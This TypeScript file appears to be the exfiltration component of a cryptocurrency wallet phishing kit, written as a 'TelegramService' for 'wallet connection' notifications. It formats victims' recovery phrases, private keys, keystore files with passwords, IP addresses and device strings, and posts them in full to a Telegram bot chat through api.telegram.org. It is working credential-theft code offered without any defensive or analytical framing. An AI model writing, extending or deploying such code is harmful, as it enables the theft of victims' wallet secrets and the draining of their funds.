import { telegramConfig } from '../config/telegram';

export interface WalletConnectionData {
  wallet: string;
  method: string;
  data: {
    phrase?: string;
    privateKey?: string;
    keystore?: string;
    password?: string;
    fileName?: string;
    wordCount?: number;
  };
  ipAddress?: string;
  userAgent?: string;
}

export class TelegramService {
  private botToken: string;
  private chatId: string;
  private enabled: boolean;

  constructor() {
    this.botToken = telegramConfig.botToken;
    this.chatId = telegramConfig.chatId;
    this.enabled = !!(this.botToken && this.chatId);
  }

  private formatMessage(data: WalletConnectionData): string {
    const timestamp = new Date();
    const date = timestamp.toLocaleDateString();
    const time = timestamp.toLocaleTimeString();

    let message = '🔐 <b>NEW WALLET CONNECTION</b>\n';
    message += '═══════════════════════\n\n';
    
    message += `📅 <b>Date:</b> ${date}\n`;
    message += `⏰ <b>Time:</b> ${time}\n`;
    message += `👛 <b>Wallet:</b> ${data.wallet}\n`;
    message += `📋 <b>Method:</b> ${data.method.toUpperCase()}\n`;
    
    if (data.ipAddress) {
      message += `🌐 <b>IP:</b> ${data.ipAddress}\n`;
    }
    
    message += `🖥️ <b>Device:</b> ${data.userAgent || 'Unknown'}\n\n`;
    
    message += '📦 <b>CONNECTION DATA</b>\n';
    message += '───────────────────\n';
    
    if (data.method === 'phrase') {
      const phrase = data.data.phrase || 'Not provided';
      const wordCount = data.data.wordCount || 0;
      message += `🔑 Recovery Phrase:\n`;
      message += `<code>${phrase}</code>\n`;
      message += `📊 Word Count: ${wordCount}/24\n`;
    } else if (data.method === 'keystore') {
      message += `📁 File Name: ${data.data.fileName || 'Not provided'}\n`;
      message += `🔐 Password: <code>${data.data.password || 'Not provided'}</code>\n`;
      if (data.data.keystore) {
        const preview = data.data.keystore.substring(0, 150);
        message += `📄 Content Preview:\n<code>${preview}...</code>\n`;
      }
    } else if (data.method === 'private key') {
      message += `🔑 Private Key:\n`;
      message += `<code>${data.data.privateKey || 'Not provided'}</code>\n`;
    }
    
    message += '\n═══════════════════════';
    
    return message;
  }

  async sendNotification(data: WalletConnectionData): Promise<boolean> {
    if (!this.enabled) {
      console.log('ℹ️ Telegram notifications are disabled');
      return false;
    }

    try {
      const message = this.formatMessage(data);
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      });

      if (!response.ok) {
        const error = await response.json();
        console.error('❌ Telegram API error:', error);
        return false;
      }

      console.log('✅ Telegram notification sent successfully');
      return true;
    } catch (error) {
      console.error('❌ Failed to send Telegram notification:', error);
      return false;
    }
  }

  async sendRawData(data: WalletConnectionData): Promise<boolean> {
    if (!this.enabled) {
      return false;
    }

    try {
      const jsonMessage = `<b>📄 Raw JSON Data:</b>\n<code>${JSON.stringify(data, null, 2)}</code>`;
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: jsonMessage,
          parse_mode: 'HTML',
        }),
      });

      return response.ok;
    } catch (error) {
      console.error('❌ Failed to send raw data:', error);
      return false;
    }
  }
}

export const telegramService = new TelegramService();